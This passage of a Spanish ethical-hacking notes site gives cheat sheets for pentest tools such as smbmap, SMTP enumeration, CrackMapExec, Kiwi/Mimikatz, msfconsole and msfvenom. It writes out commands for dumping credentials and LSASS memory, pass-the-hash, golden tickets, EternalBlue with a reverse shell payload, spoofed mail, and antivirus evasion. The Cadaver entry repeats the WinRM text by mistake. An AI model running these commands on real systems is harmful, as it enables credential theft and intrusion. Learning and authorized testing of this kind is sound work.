contrase\u00f1a -r \"Compartido\"\n</code></pre> <p>\ud83d\udc49 Muestra el contenido de la carpeta \"Compartido\".</p> <p>4\ufe0f\u20e3 Descargar un archivo de un recurso compartido</p> <pre><code>smbmap -H 192.168.1.10 -u usuario -p contrase\u00f1a -r \"Compartido\" -A \"archivo.txt\"\n</code></pre> <p>\ud83d\udc49 Descarga \"archivo.txt\" si es accesible.</p> <p>5\ufe0f\u20e3 Subir un archivo a un recurso compartido (si hay permisos de escritura)</p> <pre><code>smbmap -H 192.168.1.10 -u usuario -p contrase\u00f1a -r \"Compartido\" --upload archivo.txt\n</code></pre> <p>6\ufe0f\u20e3 Ejecutar un comando en la m\u00e1quina objetivo (si tiene privilegios)</p> <pre><code>smbmap -H 192.168.1.10 -u usuario -p contrase\u00f1a --exec \"whoami\"\n</code></pre> <p>\ud83d\udc49 Si el usuario tiene permisos, devuelve el nombre de usuario con el que se ejecut\u00f3 el comando.</p>"},{"location":"tips-tools/smbmap-tips/#casos-de-uso-en-hacking-etico","title":"\ud83d\udd25 Casos de Uso en Hacking \u00c9tico","text":"<ul> <li>Identificar recursos compartidos sin protecci\u00f3n en redes empresariales.</li> <li>Buscar archivos sensibles accesibles por cualquier usuario.</li> <li>Detectar permisos incorrectos que permitan a usuarios no autorizados modificar archivos.</li> <li>Ejecutar c\u00f3digo malicioso en servidores mal configurados.</li> </ul>"},{"location":"tips-tools/smbmap-tips/#alternativas-a-smbmap","title":"\ud83d\ude80 Alternativas a SMBMap","text":"<ul> <li><code>smbclient</code> (herramienta nativa de Samba)</li> <li><code>enum4linux</code> (para obtener informaci\u00f3n detallada de SMB y NetBIOS)</li> <li><code>nmap --script smb-*</code> (para escaneo de SMB con scripts de Nmap)</li> </ul>"},{"location":"tips-tools/smtp-tips/","title":"SMTP","text":""},{"location":"tips-tools/smtp-tips/#enumeracion-de-usuarios-en-smtp-simple-mail-transfer-protocol","title":"Enumeracion de usuarios en [[SMTP (Simple Mail Transfer Protocol)]]","text":"<ul> <li><code>scanner/smtp/smtp_enum</code></li> </ul>"},{"location":"tips-tools/smtp-tips/#verificar-si-un-correo-es-valido","title":"Verificar si un correo es valido","text":"<p><code>nc 192.168.1.1 25</code> <code>VRFY user@domain.com</code></p> <p>Si obtenemos de respuesta algo como lo siguiente es que el usuario existe:</p> <p><code>252 2.0.0 user@domain.com</code></p>"},{"location":"tips-tools/smtp-user-enum-tips/","title":"Smtp user enum tips","text":"<p>[[Tools \u26cf\ufe0f/SMTP-User-Enum \ud83d\udce8|SMTP-User-Enum \ud83d\udce8]]</p>"},{"location":"tips-tools/smtp-user-enum-tips/#uso","title":"Uso:","text":"<p><code>./smtp-user-enum -M VRFY -U usuarios.txt -t servidor.com</code></p> <p>Tambi\u00e9n puedes probar con <code>EXPN</code> o <code>RCPT TO</code>:</p> <p><code>./smtp-user-enum -M RCPT -U usuarios.txt -t servidor.com</code></p>"},{"location":"tips-tools/smtp-user-enum-tips/#diccionarios-utiles","title":"Diccionarios \u00fatiles","text":"<p><code>/usr/share/commix/src/txt/usernames.txt</code> <code>/usr/share/metasploit-framework/data/wordlists/unix_users.txt</code></p>"},{"location":"tips-tools/smtp-user-enum-tips/#conectarse-a-smtp-para-enviar-correo-falso-a-usuario-root","title":"Conectarse a SMTP para enviar correo falso a usuario root","text":"<pre><code>telnet demo.ine.local 25\nHELO attacker.xyz\nmail from: admin@attacker.xyz\nrcpt to:root@openmailbox.xyz\ndata\nSubject: Hi Root\nHello,\nThis is a fake mail sent using telnet command.\nFrom,\nAdmin\n.\n</code></pre> <p>el punto (.) indica el final de la data a enviar</p>"},{"location":"tips-tools/smtp-user-enum-tips/#usando-sendemail","title":"Usando sendemail","text":"<pre><code>sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m \"Hi root, a fake from admin\" -o tls=no\n</code></pre>"},{"location":"tips-tools/winrm-tips/","title":"WinRM","text":""},{"location":"tips-tools/winrm-tips/#ejemplo-de-uso","title":"Ejemplo de uso:","text":"<p>Para ejecutar un comando remoto a trav\u00e9s de [[Windows Remote Management (WinRM)]] , usando PowerShell, se puede usar el siguiente comando:</p> <pre><code>Enter-PSSession -ComputerName &lt;nombre_o_ip_del_computador&gt; -Credential (Get-Credential)\n</code></pre> <p>Este comando permite entrar en una sesi\u00f3n remota en el sistema especificado, y podr\u00e1s ejecutar comandos como si estuvieras en la m\u00e1quina local.</p> <p>Para ejecutar un comando espec\u00edfico en lugar de entrar en una sesi\u00f3n interactiva, puedes usar el siguiente comando:</p> <pre><code>Invoke-Command -ComputerName &lt;nombre_o_ip_del_computador&gt; -ScriptBlock { &lt;comando_a_ejecutar&gt; }\n</code></pre>"},{"location":"tips-tools/winrm-tips/#comandos-de-configuracion-de-winrm","title":"Comandos de configuraci\u00f3n de WinRM:","text":"<ol> <li> <p>Ver el estado del servicio WinRM: Para verificar si WinRM est\u00e1 habilitado y en ejecuci\u00f3n en el equipo remoto:</p> <p><code>powershell winrm get winrm/config</code></p> </li> <li> <p>Configurar un servidor remoto: Si necesitas configurar WinRM para que acepte conexiones remotas en una m\u00e1quina espec\u00edfica:</p> <p><code>powershell Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\" -Force</code></p> </li> <li> <p>Habilitar la autenticaci\u00f3n remota mediante HTTPS: Para mejorar la seguridad, es posible habilitar WinRM sobre HTTPS. Esto requiere la configuraci\u00f3n de un certificado SSL en el servidor de destino:</p> <p><code>powershell winrm quickconfig -transport:https</code></p> </li> </ol>"},{"location":"tools/cadaver/","title":"Cadaver","text":""},{"location":"tools/cadaver/#ejemplo-de-uso","title":"Ejemplo de uso:","text":"<p>Para ejecutar un comando remoto a trav\u00e9s de [[Windows Remote Management (WinRM)]] , usando PowerShell, se puede usar el siguiente comando:</p> <pre><code>Enter-PSSession -ComputerName &lt;nombre_o_ip_del_computador&gt; -Credential (Get-Credential)\n</code></pre> <p>Este comando permite entrar en una sesi\u00f3n remota en el sistema especificado, y podr\u00e1s ejecutar comandos como si estuvieras en la m\u00e1quina local.</p> <p>Para ejecutar un comando espec\u00edfico en lugar de entrar en una sesi\u00f3n interactiva, puedes usar el siguiente comando:</p> <pre><code>Invoke-Command -ComputerName &lt;nombre_o_ip_del_computador&gt; -ScriptBlock { &lt;comando_a_ejecutar&gt; }\n</code></pre>"},{"location":"tools/cadaver/#comandos-de-configuracion-de-winrm","title":"Comandos de configuraci\u00f3n de WinRM:","text":"<ol> <li> <p>Ver el estado del servicio WinRM: Para verificar si WinRM est\u00e1 habilitado y en ejecuci\u00f3n en el equipo remoto:</p> <p><code>powershell winrm get winrm/config</code></p> </li> <li> <p>Configurar un servidor remoto: Si necesitas configurar WinRM para que acepte conexiones remotas en una m\u00e1quina espec\u00edfica:</p> <p><code>powershell Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"*\" -Force</code></p> </li> <li> <p>Habilitar la autenticaci\u00f3n remota mediante HTTPS: Para mejorar la seguridad, es posible habilitar WinRM sobre HTTPS. Esto requiere la configuraci\u00f3n de un certificado SSL en el servidor de destino:</p> <p><code>powershell winrm quickconfig -transport:https</code></p> </li> </ol>"},{"location":"tools/crackmapexec/","title":"Crackmapexec","text":""},{"location":"tools/crackmapexec/#crackmapexec-cme","title":"[[Crackmapexec (CME)]]","text":"<p><code>crackmapexec</code> (CME) es una herramienta de post-explotaci\u00f3n y pentesting enfocada en redes Windows y Active Directory. Su principal funci\u00f3n es automatizar la interacci\u00f3n con protocolos como SMB, WinRM, LDAP y MSSQL, permitiendo probar credenciales, ejecutar comandos y moverse lateralmente en una red.</p>"},{"location":"tools/crackmapexec/#caracteristicas-principales-de-cme","title":"\ud83d\udd39 Caracter\u00edsticas principales de CME","text":"<p>\u2705 Autenticaci\u00f3n en masa: Puedes probar credenciales en m\u00faltiples hosts simult\u00e1neamente. \u2705 Soporte para SMB, WinRM, LDAP, MSSQL y RDP: Facilita la explotaci\u00f3n de redes Windows. \u2705 Enumeraci\u00f3n de usuarios y recursos compartidos: Permite listar usuarios, grupos y shares SMB. \u2705 Ejecuci\u00f3n remota de comandos: Puedes ejecutar comandos en sistemas remotos sin necesidad de acceso f\u00edsico. \u2705 Movilidad lateral: Si logras credenciales v\u00e1lidas, puedes expandir tu acceso en la red.</p>"},{"location":"tools/crackmapexec/#instalacion-de-crackmapexec","title":"\ud83d\udd39 Instalaci\u00f3n de CrackMapExec","text":"<p>Si usas Kali Linux o Parrot OS, CME ya viene instalado. Si no, puedes instalarlo manualmente con:</p> <p><code>pip install crackmapexec</code></p> <p>O desde su repositorio oficial:</p> <p><code>git clone https://github.com/Porchetta-Industries/CrackMapExec cd CrackMapExec pip3 install -r requirements.txt python3 setup.py install</code></p>"},{"location":"tools/davtest/","title":"Davtest","text":""},{"location":"tools/davtest/#davtest-explotacion-de-webdav","title":"\ud83d\udd25 davtest - Explotaci\u00f3n de WebDAV \ud83d\udd25","text":"<p><code>davtest</code> es una herramienta de pentesting dise\u00f1ada para probar servidores WebDAV y determinar si permiten la subida de archivos maliciosos. WebDAV es una extensi\u00f3n del protocolo HTTP que permite subir, modificar y eliminar archivos en el servidor.</p>"},{"location":"tools/davtest/#1-como-funciona-davtest","title":"\ud83d\udccc 1. \u00bfC\u00f3mo funciona <code>davtest</code>?","text":"<p><code>davtest</code> intenta subir archivos con diferentes extensiones (.php, .asp, .jsp, .html, .txt, etc.) para ver cu\u00e1les son permitidos y si pueden ejecutarse en el servidor. Tambi\u00e9n prueba la eliminaci\u00f3n de archivos (<code>DELETE</code>), renombrado (<code>MOVE</code>) y creaci\u00f3n de directorios (<code>MKCOL</code>).</p>"},{"location":"tools/davtest/#2-instalacion-de-davtest","title":"\ud83d\udd39 2. Instalaci\u00f3n de <code>davtest</code>","text":"<p>En Kali Linux y Parrot OS, <code>davtest</code> viene preinstalado. Si necesitas instalarlo, usa:</p> <pre><code>sudo apt install davtest\n</code></pre>"},{"location":"tools/davtest/#3-uso-basico","title":"\ud83d\udd39 3. Uso B\u00e1sico","text":"<pre><code>davtest -url http://target.com/\n</code></pre> <p>\u2705 Ejecuta pruebas autom\u00e1ticas para determinar qu\u00e9 tipos de archivos pueden subirse.</p>"},{"location":"tools/davtest/#4-opciones-utiles","title":"\ud83d\udd39 4. Opciones \u00fatiles","text":"Opci\u00f3n Descripci\u00f3n <code>-url &lt;URL&gt;</code> Especifica la URL objetivo. <code>-upload &lt;archivo&gt;</code> Prueba la subida de un archivo espec\u00edfico. <code>-send &lt;metodo&gt;</code> Especifica un m\u00e9todo HTTP (ej. <code>PUT</code>, <code>DELETE</code>, <code>MOVE</code>). <code>-move &lt;archivo&gt;</code> Prueba la funci\u00f3n de mover archivos en el servidor. <code>-clean</code> Borra los archivos subidos despu\u00e9s de la prueba. <code>-auth &lt;usuario:contrase\u00f1a&gt;</code> Usa autenticaci\u00f3n b\u00e1sica si es necesaria."},{"location":"tools/dirb/","title":"Dirb","text":"<p>[[Dirb]] es otra herramienta de fuzzing de directorios y archivos en aplicaciones web, similar a DirBuster, pero con una interfaz de l\u00ednea de comandos m\u00e1s simple. Al igual que DirBuster, <code>dirb</code> se usa para realizar un ataque de fuzzing y descubrir recursos ocultos, como directorios o archivos que no est\u00e1n f\u00e1cilmente accesibles desde el sitio web.</p>"},{"location":"tools/dirb/#caracteristicas-de-dirb","title":"Caracter\u00edsticas de <code>dirb</code>:","text":"<ul> <li>Fuzzing de directorios y archivos: Similar a DirBuster, <code>dirb</code> prueba rutas de directorios y archivos en el servidor web mediante un diccionario de palabras.</li> <li>Interfaz de l\u00ednea de comandos: <code>dirb</code> es m\u00e1s sencillo en comparaci\u00f3n con DirBuster porque no tiene interfaz gr\u00e1fica, pero es igualmente efectivo para la b\u00fasqueda de directorios y archivos.</li> <li>Soporte para autenticaci\u00f3n b\u00e1sica: Al igual que <code>dirbuster</code>, <code>dirb</code> permite usar autenticaci\u00f3n b\u00e1sica HTTP para acceder a sitios protegidos.</li> <li>Configuraci\u00f3n m\u00ednima: Es m\u00e1s f\u00e1cil de usar para aquellos que prefieren una herramienta basada en la terminal, sin muchas configuraciones adicionales.</li> </ul>"},{"location":"tools/enum4linux/","title":"Enum4Linux","text":"<p><code>enum4linux</code> es una herramienta en l\u00ednea de comandos dise\u00f1ada para recopilar informaci\u00f3n de sistemas Windows a trav\u00e9s del protocolo SMB (Server Message Block). Se utiliza com\u00fanmente en auditor\u00edas de seguridad y pruebas de penetraci\u00f3n para enumerar recursos compartidos, usuarios, grupos y configuraciones de red en sistemas Windows.</p>"},{"location":"tools/enum4linux/#instalacion","title":"\ud83d\udccc Instalaci\u00f3n","text":"<p>Si <code>enum4linux</code> no est\u00e1 instalado en tu sistema, puedes instalarlo de la siguiente manera:</p> <p><code>sudo apt update &amp;&amp; sudo apt install enum4linux</code></p> <p>En algunas distribuciones, puedes necesitar clonar el repositorio:</p> <p><code>git clone https://github.com/CiscoCXSecurity/enum4linux cd enum4linux chmod +x enum4linux.pl</code></p>"},{"location":"tools/ffuf/","title":"Ffuf","text":"<p>FFuF (tambi\u00e9n escrito como [[FFuF\ud83e\udeb2]]) es una herramienta r\u00e1pida de fuzzing para encontrar recursos web ocultos, como directorios, archivos, par\u00e1metros y subdominios. Es ampliamente utilizada en pruebas de penetraci\u00f3n y hacking \u00e9tico.</p>"},{"location":"tools/ffuf/#caracteristicas-principales-de-ffuf","title":"\ud83d\udd39 Caracter\u00edsticas principales de FFuF","text":"<p>\u2705 Velocidad y eficiencia: Usa m\u00faltiples hilos para realizar fuzzing r\u00e1pidamente. \u2705 Flexibilidad: Permite realizar ataques de fuerza bruta en URLs, par\u00e1metros, cabeceras HTTP y m\u00e1s. \u2705 Soporte para diccionarios: Puedes usar listas de palabras para probar directorios, subdominios, etc. \u2705 Personalizaci\u00f3n avanzada: Soporta expresiones regulares, filtros por tama\u00f1o de respuesta, c\u00f3digos de estado HTTP y m\u00e1s.</p>"},{"location":"tools/ffuf/#instalacion-de-ffuf","title":"\ud83d\udd39 Instalaci\u00f3n de FFuF","text":"<p>Si usas Kali Linux o Parrot OS, ya viene preinstalado. Si necesitas instalarlo manualmente en Linux o macOS, puedes hacerlo con:</p> <pre><code>sudo apt install ffuf  # Debian/Ubuntu\n</code></pre> <p>O compilando desde su c\u00f3digo fuente con Go:</p> <pre><code>go install github.com/ffuf/ffuf/v2@latest\n</code></pre>"},{"location":"tools/httrack/","title":"Httrack","text":"<p>[[HTTRack]] es una herramienta de c\u00f3digo abierto que permite copiar o descargar sitios web completos a tu computadora para navegar sin conexi\u00f3n. Es un clonador de sitios web que descarga todos los archivos y recursos (HTML, im\u00e1genes, scripts, hojas de estilo, etc.) de un sitio web para permitirte verlo localmente como si estuvieras en l\u00ednea.</p> <p>HTTrack es ampliamente utilizado en pruebas de seguridad y an\u00e1lisis de sitios web, ya que puede ayudarte a obtener una copia local de un sitio web para realizar un an\u00e1lisis offline o auditor\u00edas de seguridad. Tambi\u00e9n es \u00fatil para archivar sitios web o hacer copias de seguridad de contenido web.</p>"},{"location":"tools/httrack/#caracteristicas-principales-de-httrack","title":"Caracter\u00edsticas principales de HTTrack:","text":"<ol> <li> <p>Descargar sitios completos: HTTrack descarga todos los archivos necesarios para que puedas navegar por un sitio web sin conexi\u00f3n. Esto incluye im\u00e1genes, archivos CSS, JavaScript, etc.</p> </li> <li> <p>Seguimiento de enlaces: La herramienta sigue todos los enlaces internos y externos, y descarga el contenido relacionado. Se asegura de que la estructura del sitio web se mantenga.</p> </li> <li> <p>Configuraci\u00f3n flexible: Puedes personalizar qu\u00e9 partes del sitio descargar, c\u00f3mo manejar los enlaces o excluir contenido espec\u00edfico (por ejemplo, im\u00e1genes o archivos grandes).</p> </li> <li> <p>Modo multihilo: HTTrack permite descargar el sitio web usando m\u00faltiples conexiones simult\u00e1neas, lo que acelera el proceso.</p> </li> <li> <p>Soporte para reanudaci\u00f3n: Si la descarga se interrumpe, HTTrack puede reanudar la descarga desde donde se qued\u00f3.</p> </li> <li> <p>Configuraci\u00f3n de restricciones de acceso: Permite configurar proxies, credenciales de autenticaci\u00f3n, y limitar la velocidad de descarga, lo que puede ser \u00fatil para pruebas de penetraci\u00f3n o auditor\u00edas.</p> </li> </ol> <p>Ejecutar HTTrack desde terminal</p> <p><code>httrack http://www.ejemplo.com -O /ruta/a/la/carpeta/donde/guardar</code></p>"},{"location":"tools/hydra/","title":"Hydra","text":"<p>[[Hydra\ud83d\udc09]] es una herramienta de fuerza bruta utilizada para realizar ataques de autenticaci\u00f3n contra diversos protocolos y servicios. Es r\u00e1pida, flexible y soporta m\u00faltiples m\u00e9todos de autenticaci\u00f3n, como SSH, RDP, SMB, FTP, HTTP, MySQL, PostgreSQL, entre otros.</p>"},{"location":"tools/hydra/#instalacion","title":"\ud83d\udccc Instalaci\u00f3n","text":"<p>Si no lo tienes instalado, puedes hacerlo con:</p> <p><code>sudo apt update &amp;&amp; sudo apt install hydra</code></p> <p>O en Kali Linux, donde suele venir preinstalado.</p>"},{"location":"tools/kiwi/","title":"Kiwi","text":"<p>Para utilizar Kiwi con Meterpreter en el contexto de pruebas de penetraci\u00f3n y post-explotaci\u00f3n, es importante entender qu\u00e9 es Kiwi, c\u00f3mo se carga y qu\u00e9 comandos puedes utilizar. A continuaci\u00f3n, te proporciono una gu\u00eda completa:</p>"},{"location":"tools/kiwi/#que-es-kiwi","title":"\u00bfQu\u00e9 es Kiwi?","text":"<p>Kiwi es una extensi\u00f3n de Meterpreter que permite interactuar con el m\u00f3dulo Mimikatz, una herramienta ampliamente utilizada para extraer credenciales, hashes y tickets Kerberos de la memoria en sistemas Windows. Es especialmente \u00fatil en la fase de post-explotaci\u00f3n para escalar privilegios o moverte lateralmente en una red.</p>"},{"location":"tools/kiwi/#requisitos-previos","title":"Requisitos previos","text":"<ol> <li>Meterpreter en la m\u00e1quina objetivo: Debes tener una sesi\u00f3n de Meterpreter activa en un sistema Windows.</li> <li>Privilegios adecuados: Para usar Kiwi, necesitas tener privilegios de administrador o SYSTEM en la m\u00e1quina objetivo.</li> </ol>"},{"location":"tools/kiwi/#cargar-kiwi-en-meterpreter","title":"Cargar Kiwi en Meterpreter","text":"<p>Una vez que tienes una sesi\u00f3n de Meterpreter, puedes cargar Kiwi con el siguiente comando:</p> <pre><code>load kiwi\n</code></pre> <p>Esto cargar\u00e1 la extensi\u00f3n Kiwi y te permitir\u00e1 usar sus funcionalidades.</p>"},{"location":"tools/kiwi/#comandos-principales-de-kiwi","title":"Comandos principales de Kiwi","text":""},{"location":"tools/kiwi/#1-credenciales-y-hashes","title":"1. Credenciales y hashes","text":"<ul> <li>Obtener todos los hashes de contrase\u00f1as:</li> </ul> <p><code>bash   lsa_dump_sam</code></p> <p>Este comando extrae los hashes de las contrase\u00f1as    almacenadas en la base de datos SAM.</p> <ul> <li>Obtener credenciales de la memoria (LSASS):</li> </ul> <p><code>bash   lsa_dump_secrets</code></p> <p>Extrae credenciales almacenadas en la memoria del proceso LSASS.</p> <ul> <li>Obtener tickets Kerberos:</li> </ul> <p><code>bash   kerberos_ticket_list</code></p> <p>Lista los tickets Kerberos almacenados en la memoria.</p>"},{"location":"tools/kiwi/#2-pass-the-hash","title":"2. Pass-the-Hash","text":"<ul> <li>Usar un hash NTLM para autenticarte:</li> </ul> <p><code>bash   lsa_pth &lt;usuario&gt; &lt;dominio&gt; &lt;hash_ntlm&gt;</code></p> <p>Este comando te permite autenticarte en otros sistemas usando un hash NTLM.</p>"},{"location":"tools/kiwi/#3-golden-ticket","title":"3. Golden Ticket","text":"<ul> <li>Crear un Golden Ticket:</li> </ul> <p><code>bash   golden_ticket_create &lt;usuario&gt; &lt;dominio&gt; &lt;sid&gt; &lt;krbtgt_hash&gt;</code></p> <p>Genera un Golden Ticket para obtener acceso a cualquier recurso en el dominio.</p>"},{"location":"tools/kiwi/#4-volcado-de-memoria","title":"4. Volcado de memoria","text":"<ul> <li>Volcar la memoria del proceso LSASS:</li> </ul> <p><code>bash   lsa_dump_memory</code></p> <p>Este comando vuelca la memoria del proceso LSASS, que puede contener credenciales.</p>"},{"location":"tools/kiwi/#5-otras-funcionalidades","title":"5. Otras funcionalidades","text":"<ul> <li>Listar todos los comandos disponibles:</li> </ul> <p><code>bash   help</code></p> <p>Muestra una lista de todos los comandos disponibles en Kiwi.</p>"},{"location":"tools/kiwi/#ejemplo-de-uso","title":"Ejemplo de uso","text":"<ol> <li>Obtener una sesi\u00f3n de Meterpreter en la m\u00e1quina objetivo.</li> <li>Cargar Kiwi:</li> </ol> <p><code>bash    load kiwi</code></p> <ol> <li>Extraer hashes de contrase\u00f1as:</li> </ol> <p><code>bash    lsa_dump_sam</code></p> <ol> <li>Usar un hash NTLM para autenticarte en otro sistema:</li> </ol> <p><code>bash    lsa_pth Administrador DOMINIO aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4</code></p>"},{"location":"tools/kiwi/#consideraciones-de-seguridad","title":"Consideraciones de seguridad","text":"<ul> <li>Uso \u00e9tico: Kiwi y Mimikatz son herramientas poderosas que deben usarse solo en entornos autorizados, como pruebas de penetraci\u00f3n o auditor\u00edas de seguridad.</li> <li>Detecci\u00f3n: El uso de Kiwi puede ser detectado por soluciones de seguridad como antivirus o EDR (Endpoint Detection and Response).</li> </ul>"},{"location":"tools/kiwi/#alternativas-a-kiwi","title":"Alternativas a Kiwi","text":"<p>Si no puedes cargar Kiwi, puedes usar el m\u00f3dulo de Mimikatz directamente desde Meterpreter:</p> <pre><code>run mimikatz\n</code></pre> <p>Con esta informaci\u00f3n, deber\u00edas poder utilizar Kiwi en Meterpreter para extraer credenciales y realizar tareas de post-explotaci\u00f3n en sistemas Windows.</p>"},{"location":"tools/msfconsole/","title":"Msfconsole","text":""},{"location":"tools/msfconsole/#que-es-msfconsole-en-metasploit","title":"\ud83d\udd25 \u00bfQu\u00e9 es <code>msfconsole</code> en Metasploit?","text":"<p><code>msfconsole</code> es la interfaz principal de Metasploit Framework (MSF), una herramienta de pentesting que permite realizar ataques, explotaci\u00f3n de vulnerabilidades, post-explotaci\u00f3n y mucho m\u00e1s.</p> <p>Es el coraz\u00f3n de Metasploit, ya que desde aqu\u00ed puedes: \u2705 Escanear redes y enumerar servicios. \u2705 Buscar y ejecutar exploits. \u2705 Cargar payloads para tomar control de un sistema. \u2705 Usar m\u00f3dulos auxiliares para escaneo, fuerza bruta, etc. \u2705 Administrar sesiones con <code>meterpreter</code>.</p>"},{"location":"tools/msfconsole/#como-iniciar-msfconsole","title":"\ud83d\ude80 C\u00f3mo iniciar <code>msfconsole</code>","text":"<p>Para abrir <code>msfconsole</code>, simplemente ejecuta en la terminal:</p> <p><code>msfconsole</code></p> <p>Despu\u00e9s de cargar, ver\u00e1s el prompt de Metasploit:</p> <p><code>msf &gt;</code></p> <p>Desde aqu\u00ed puedes ejecutar comandos para interactuar con los m\u00f3dulos y herramientas de Metasploit.</p>"},{"location":"tools/msfconsole/#comandos-basicos-en-msfconsole","title":"\ud83d\udee0\ufe0f Comandos B\u00e1sicos en <code>msfconsole</code>","text":""},{"location":"tools/msfconsole/#1-buscar-exploits-y-modulos","title":"\ud83d\udd39 1. Buscar exploits y m\u00f3dulos","text":"<p><code>search windows search smb search exploit android</code></p> <p>\ud83d\udca1 Filtra por tipo de exploit, servicio o sistema operativo.</p>"},{"location":"tools/msfconsole/#2-usar-un-modulo","title":"\ud83d\udd39 2. Usar un m\u00f3dulo","text":"<p><code>use exploit/windows/smb/ms17_010_eternalblue</code></p> <p>\ud83d\udca1 Carga el exploit para atacar una vulnerabilidad en SMB.</p>"},{"location":"tools/msfconsole/#3-mostrar-informacion-sobre-un-modulo","title":"\ud83d\udd39 3. Mostrar informaci\u00f3n sobre un m\u00f3dulo","text":"<p><code>info exploit/windows/smb/ms17_010_eternalblue</code></p> <p>\ud83d\udca1 Ver detalles del exploit, puertos, requisitos, opciones configurables.</p>"},{"location":"tools/msfconsole/#4-configurar-opciones-de-un-modulo","title":"\ud83d\udd39 4. Configurar opciones de un m\u00f3dulo","text":"<p><code>set RHOSTS 192.168.1.100 set LHOST 192.168.1.50 set PAYLOAD windows/meterpreter/reverse_tcp</code></p> <p>\ud83d\udca1 Define la IP del objetivo (<code>RHOSTS</code>) y tu IP (<code>LHOST</code>).</p>"},{"location":"tools/msfconsole/#5-ejecutar-un-exploit","title":"\ud83d\udd39 5. Ejecutar un exploit","text":"<p><code>exploit</code></p> <p>o</p> <p><code>run</code></p> <p>\ud83d\udca1 Ejecuta el ataque con la configuraci\u00f3n establecida.</p>"},{"location":"tools/msfconsole/#6-mostrar-sesiones-activas","title":"\ud83d\udd39 6. Mostrar sesiones activas","text":"<p><code>sessions -l</code></p> <p>\ud83d\udca1 Lista sesiones activas si lograste comprometer un sistema.</p>"},{"location":"tools/msfconsole/#7-conectarse-a-una-sesion-meterpreter","title":"\ud83d\udd39 7. Conectarse a una sesi\u00f3n <code>meterpreter</code>","text":"<p><code>sessions -i 1</code></p> <p>\ud83d\udca1 Interact\u00faa con la sesi\u00f3n n\u00famero 1 (puede variar).</p>"},{"location":"tools/msfconsole/#estructura-de-metasploit-msfconsole","title":"\ud83d\udccc Estructura de Metasploit (<code>msfconsole</code>)","text":"<p>Metasploit tiene diferentes tipos de m\u00f3dulos, y <code>msfconsole</code> permite administrarlos todos:</p> Tipo Descripci\u00f3n Exploit C\u00f3digo que aprovecha una vulnerabilidad en un sistema. Payload C\u00f3digo ejecutado tras la explotaci\u00f3n (ej. Meterpreter). Auxiliary M\u00f3dulos que ayudan en escaneo, enumeraci\u00f3n, etc. Post M\u00f3dulos para mantener acceso o extraer informaci\u00f3n. Encoders Ofuscan payloads para evadir antivirus. Nops Relleno para evitar detecci\u00f3n en exploits."},{"location":"tools/msfvenom/","title":"Msfvenom","text":""},{"location":"tools/msfvenom/#msfvenom-generacion-de-payloads-en-metasploit","title":"\ud83d\udd25 MSFVenom - Generaci\u00f3n de Payloads en Metasploit \ud83d\udd25","text":"<p><code>msfvenom</code> es una herramienta de Metasploit para generar payloads personalizados y crear ejecutables maliciosos. Combina las funciones de <code>msfpayload</code> y <code>msfencode</code> en una sola utilidad.</p>"},{"location":"tools/msfvenom/#1-sintaxis-basica","title":"\ud83d\udd39 1. Sintaxis b\u00e1sica","text":"<pre><code>msfvenom -p &lt;PAYLOAD&gt; LHOST=&lt;IP&gt; LPORT=&lt;PUERTO&gt; -f &lt;FORMATO&gt; -o &lt;ARCHIVO&gt;\n</code></pre> <p>\u2705 Explicaci\u00f3n:</p> <ul> <li><code>-p &lt;PAYLOAD&gt;</code> \u2192 Especifica el tipo de payload (ej. <code>windows/meterpreter/reverse_tcp</code>).</li> <li><code>LHOST=&lt;IP&gt;</code> \u2192 Direcci\u00f3n IP del atacante (tu m\u00e1quina).</li> <li><code>LPORT=&lt;PUERTO&gt;</code> \u2192 Puerto donde escuchar\u00e1s la conexi\u00f3n.</li> <li><code>-f &lt;FORMATO&gt;</code> \u2192 Formato de salida (ej. <code>exe</code>, <code>elf</code>, <code>apk</code>, <code>raw</code>, <code>c</code>, <code>python</code>).</li> <li><code>-o &lt;ARCHIVO&gt;</code> \u2192 Nombre del archivo de salida.</li> </ul>"},{"location":"tools/msfvenom/#resumen","title":"Resumen","text":"<p>\ud83d\ude80 <code>msfvenom</code> es una herramienta poderosa para crear payloads personalizados y obtener acceso remoto a sistemas vulnerables. Para hacerlo m\u00e1s efectivo: \u2705 Usa <code>-e</code> para evadir detecci\u00f3n. \u2705 Modifica manualmente los payloads (<code>-f c</code>, <code>-f python</code>). \u2705 Configura correctamente <code>LHOST</code> y <code>LPORT</code>.</p>"},{"location":"tools/mysql/","title":"Mysql","text":"<p>[[MySQL \ud83d\udcc4]] es una base de datos relacional open-source basado en SQL (Structured Query Language). Es tipicamente usado para almacenar datos y es ampliamente utilizada para usar en muchas aplicaciones. MySQL utiliza el puerto 3306 TCP por defecto, como cualquier servicio que puede ser hosteado en un puerto TCP abierto</p> <p>Como conectarse a una base de datos por terminal</p> <p><code>mysql -u username -p -h 192.168.1.1</code></p>"},{"location":"tools/nessus/","title":"Nessus","text":"<p>[[Nessus]] es un esc\u00e1ner de vulnerabilidades desarrollado por Tenable, Inc. que permite identificar fallos de seguridad en sistemas, redes y aplicaciones. Es ampliamente utilizado por administradores de seguridad y equipos de ciberseguridad para evaluar la postura de seguridad de una infraestructura.</p>"},{"location":"tools/nessus/#caracteristicas-principales-de-nessus","title":"\ud83d\udd39 Caracter\u00edsticas principales de Nessus","text":"<p>\u2714\ufe0f Escaneo de vulnerabilidades: Detecta puertos abiertos, servicios en ejecuci\u00f3n y configuraciones inseguras. \u2714\ufe0f Detecci\u00f3n de exploits conocidos: Identifica vulnerabilidades explotables bas\u00e1ndose en bases de datos como CVE y otras fuentes. \u2714\ufe0f An\u00e1lisis de configuraciones: Eval\u00faa configuraciones incorrectas en sistemas operativos y aplicaciones. \u2714\ufe0f Reportes detallados: Genera informes con recomendaciones para mitigar riesgos. \u2714\ufe0f Escaneo de redes y dispositivos: Puede analizar sistemas Windows, Linux, macOS, routers, firewalls, etc. \u2714\ufe0f Plugins actualizados: Se mantiene al d\u00eda con nuevas vulnerabilidades a trav\u00e9s de su base de datos de plugins.</p>"},{"location":"tools/nessus/#versiones-de-nessus","title":"\ud83d\udd39 Versiones de Nessus","text":"<p>\ud83d\udd38 Nessus Essentials (Gratis): Para uso personal con un l\u00edmite de 16 direcciones IP. \ud83d\udd38 Nessus Professional (De pago): Para empresas y pruebas avanzadas. \ud83d\udd38 Tenable.io / Tenable.sc: Versiones m\u00e1s completas para entornos empresariales.</p>"},{"location":"tools/nessus/#como-funciona","title":"\ud83d\udd39 